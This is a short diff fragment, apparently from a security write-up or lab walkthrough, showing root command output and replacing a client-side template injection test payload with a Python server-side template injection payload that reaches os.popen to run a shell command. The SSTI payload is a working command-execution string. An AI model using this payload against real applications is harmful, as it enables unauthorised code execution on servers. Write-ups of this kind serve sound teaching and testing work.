@@ -245,5 +245,5 @@ uid=0(root) gid=0(root) groups=0(root)
 We are root.
 
 ```
-{{_createElementBlock.constructor("alert(1)")()}}
+{{"".__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}
 ```
